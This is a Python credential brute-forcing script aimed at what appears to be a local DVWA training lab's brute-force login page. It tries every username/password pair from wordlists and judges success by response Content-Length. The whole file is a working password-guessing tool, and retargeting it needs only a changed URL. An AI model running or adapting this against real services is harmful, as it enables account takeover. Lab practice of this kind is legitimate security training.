import shlex
import requests
import os
import urllib.parse
import argparse
from itertools import product
from typing import List, Tuple, Optional

BASE = "http://localhost:5000/vulnerabilities/brute/"
DEFAULT_COOKIE = "security=low; pma_lang=es; pmaUser-1=LGXP1fD29WkenveFKmcAAAxOnxOhA19EfGfpD8pfuCLeVUrp1Vpgiq0gX18%3D; PHPSESSID=fuf157c9r1gfgir2cjuvg40o84; security=low"

DEFAULT_HEADERS = [
    ("Host", "localhost:5000"),
    ("sec-ch-ua", '"Not=A?Brand";v="24", "Chromium";v="140"'),
    ("sec-ch-ua-mobile", "?0"),
    ("sec-ch-ua-platform", '"Linux"'),
    ("Accept-Language", "es-ES,es;q=0.9"),
    ("Upgrade-Insecure-Requests", "1"),
    ("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"),
    ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"),
    ("Sec-Fetch-Site", "same-origin"),
    ("Sec-Fetch-Mode", "navigate"),
    ("Sec-Fetch-User", "?1"),
    ("Sec-Fetch-Dest", "document"),
    ("Referer", "http://localhost:5000/vulnerabilities/brute/"),
    ("Accept-Encoding", "gzip, deflate, br"),
    ("Connection", "keep-alive"),
]

def load_list(path: str) -> List[str]:
    if not os.path.isabs(path) and not os.path.exists(path):
        base = os.path.dirname(__file__)
        alt = os.path.join(base, path)
        if os.path.exists(alt):
            path = alt
    with open(path, "r") as f:
        return [l.strip() for l in f if l.strip()]

def build_request_debug(url: str, cookie: Optional[str], headers: List[Tuple[str,str]]) -> str:
    parts = ["curl", "--path-as-is", "-i", "-s", "-k", "-X", "GET"]
    for k, v in headers:
        parts.extend(["-H", f"{k}: {v}"])
    if cookie:
        parts.extend(["-b", cookie])
    parts.append(url)
    return " ".join(shlex.quote(x) for x in parts)

def parse_cookie_string(cookie: str) -> dict:
    d = {}
    for part in cookie.split(';'):
        part = part.strip()
        if not part:
            continue
        if '=' in part:
            k, v = part.split('=', 1)
            d[k.strip()] = v.strip()
        else:
            d[part] = ''
    return d

def cookie_dict_to_string(d: dict) -> str:
    return '; '.join(f"{k}={v}" for k, v in d.items())

def merge_cookies(default: Optional[str], override: Optional[str]) -> Optional[str]:
    if not default and not override:
        return None
    base = parse_cookie_string(default or '')
    over = parse_cookie_string(override or '')
    base.update(over)
    return cookie_dict_to_string(base)

def parse_content_length_from_headers(raw: str) -> Optional[int]:
    headers = raw.split('\r\n\r\n', 1)[0]
    for line in headers.split('\r\n'):
        if line.lower().startswith('content-length:'):
            try:
                return int(line.split(':',1)[1].strip())
            except ValueError:
                return None
    return None

def run_check(users_file: str, pwds_file: str, cookie: Optional[str], thresh: int, dry_run: bool) -> List[Tuple[str,str,int]]:
    users = load_list(users_file)
    pwds = load_list(pwds_file)
    matches: List[Tuple[str,str,int]] = []
    for u, p in product(users, pwds):
        qu = urllib.parse.quote_plus(u)
        qp = urllib.parse.quote_plus(p)
        url = f"{BASE}?username={qu}&password={qp}&Login=Login"
        debug_cmd = build_request_debug(url, cookie, DEFAULT_HEADERS)
        if dry_run:
            print("DRY:", debug_cmd)
            continue
        try:
            headers_dict = {k: v for k, v in DEFAULT_HEADERS}
            cookie_dict = parse_cookie_string(cookie or '')
            resp = requests.get(url, headers=headers_dict, cookies=cookie_dict, timeout=12, verify=False)
        except Exception as e:
            print(f"[ERROR] {u}/{p} -> {e}")
            continue
        cl = None
        if 'Content-Length' in resp.headers:
            try:
                cl = int(resp.headers.get('Content-Length'))
            except Exception:
                cl = None

        if cl is not None and cl > thresh:
            print(f"[POTENTIAL SUCCESS] {u}:{p}  Content-Length(header)={cl}")
            matches.append((u, p, cl))
        else:
            print(f"[-] {u}:{p}  header_cl={cl}")
    return matches

def main():
    p = argparse.ArgumentParser(description="Validate credentials using curl and Content-Length header")
    p.add_argument('--users', default='users.txt', help='path to users file')
    p.add_argument('--passwords', default='passwords.txt', help='path to passwords file')
    p.add_argument('--cookie', default='security=low', help='cookie string for curl -b (e.g. "security=low")')
    p.add_argument('--threshold', type=int, default=1460, help='Content-Length threshold to consider success')
    p.add_argument('--dry-run', action='store_true', help='only print curl commands without executing')
    args = p.parse_args()

    merged_cookie = merge_cookies(DEFAULT_COOKIE, args.cookie)
    matches = run_check(args.users, args.passwords, merged_cookie, args.threshold, args.dry_run)
    print('\n==== Exitos ====\n')
    if args.dry_run:
        print('Dry run: no requests performed')
        return
    for u, p, cl in matches:
        print(u, p)

    print(f"\nTotal matches: {len(matches)}\n")

if __name__ == '__main__':
    main()
